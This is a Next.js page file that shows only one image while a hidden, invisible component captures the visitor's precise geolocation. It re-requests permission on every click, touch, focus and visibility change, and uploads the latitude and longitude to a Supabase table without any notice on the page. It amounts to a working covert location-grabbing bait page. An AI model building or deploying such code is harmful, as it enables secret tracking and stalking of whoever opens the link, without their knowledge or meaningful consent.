'use client';

import { useEffect } from 'react';

const LOCATION_WATCH_MS = 25000;
const GOOD_ENOUGH_ACCURACY_METERS = 25;
const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
const SUPABASE_ANON_KEY = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;

function uploadLocation(position: GeolocationPosition) {
  if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
    return;
  }

  void fetch(`${SUPABASE_URL.replace(/\/$/, '')}/rest/v1/locations`, {
    method: 'POST',
    headers: {
      apikey: SUPABASE_ANON_KEY,
      Authorization: `Bearer ${SUPABASE_ANON_KEY}`,
      'Content-Type': 'application/json',
      Prefer: 'return=minimal',
    },
    body: JSON.stringify({
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
    }),
  });
}

function LocationSaver() {
  useEffect(() => {
    if (!navigator.geolocation || !SUPABASE_URL || !SUPABASE_ANON_KEY) {
      return;
    }

    let bestPosition: GeolocationPosition | null = null;
    let uploaded = false;
    let watchId: number | null = null;
    let timeoutId: ReturnType<typeof setTimeout> | null = null;

    const stopWatching = () => {
      if (timeoutId) {
        clearTimeout(timeoutId);
        timeoutId = null;
      }

      if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
      }
    };

    const uploadBestPosition = () => {
      if (uploaded || !bestPosition) {
        stopWatching();
        return;
      }

      uploaded = true;
      stopWatching();
      uploadLocation(bestPosition);
    };

    const rememberBestPosition = (position: GeolocationPosition) => {
      if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
        bestPosition = position;
      }

      if (position.coords.accuracy <= GOOD_ENOUGH_ACCURACY_METERS) {
        uploadBestPosition();
      }
    };

    const startLocationCapture = () => {
      if (uploaded || watchId !== null) {
        return;
      }

      bestPosition = null;

      watchId = navigator.geolocation.watchPosition(
        rememberBestPosition,
        () => {
          stopWatching();
        },
        { enableHighAccuracy: true, timeout: LOCATION_WATCH_MS, maximumAge: 0 }
      );

      navigator.geolocation.getCurrentPosition(
        rememberBestPosition,
        () => undefined,
        { enableHighAccuracy: true, timeout: LOCATION_WATCH_MS, maximumAge: 0 }
      );

      timeoutId = setTimeout(uploadBestPosition, LOCATION_WATCH_MS);
    };

    const retryLocationCapture = () => {
      if (!uploaded) {
        startLocationCapture();
      }
    };

    startLocationCapture();

    window.addEventListener('focus', retryLocationCapture);
    document.addEventListener('visibilitychange', retryLocationCapture);
    document.addEventListener('click', retryLocationCapture);
    document.addEventListener('touchstart', retryLocationCapture);

    return () => {
      stopWatching();
      window.removeEventListener('focus', retryLocationCapture);
      document.removeEventListener('visibilitychange', retryLocationCapture);
      document.removeEventListener('click', retryLocationCapture);
      document.removeEventListener('touchstart', retryLocationCapture);
    };
  }, []);

  return null;
}

export default function Page() {
  return (
    <>
      <img src="https://neostuffs.com/wp-content/uploads/2016/05/rastra.jpg" alt="" />
      <LocationSaver />
    </>
  );
}
